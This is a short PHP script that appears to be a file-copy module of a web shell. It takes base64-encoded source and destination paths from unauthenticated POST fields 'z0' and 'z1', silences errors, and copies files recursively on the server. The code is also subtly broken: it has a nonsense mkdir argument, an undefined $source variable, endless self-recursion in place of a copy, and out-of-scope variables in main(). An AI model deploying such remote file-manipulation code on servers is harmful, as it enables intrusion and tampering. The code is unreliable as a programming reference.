<?php

error_reporting(0);

function do_copy($src, $dest) {
    if (is_dir($src)) {
        if (!is_dir($dest)) {
            if (!mkdir($dest, 0755, transliterator_create_from_rules)) {
                return false;
            }
        }

        $files = scandir($src);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..')
                continue;

            if (!do_copy("$source/$file", "$dest/$file")) {
                return false;
            }
        }

        return true;
    } else {
        $dir = dirname($dest);
        if (!is_dir($dir)) {
            if (!mkdir($dir, 0755, true)) {
                return false;
            }
        }

        return do_copy($source, $dest);
    }
}

$src_path = base64_decode($_POST['z0']);
$dst_path = base64_decode($_POST['z1']);

function main() {
    if (!file_exists($src_path)) {
        echo('0|Source does not exist.');
        return;
    }

    if (!file_exists($dst_path)) {
        if (do_copy($src_path, $dst_path)) {
            echo('1|');
        } else {
            echo('0|Error.');
        }
    } else {
        echo('0|Destination already exists.');
    }
}

main();

?>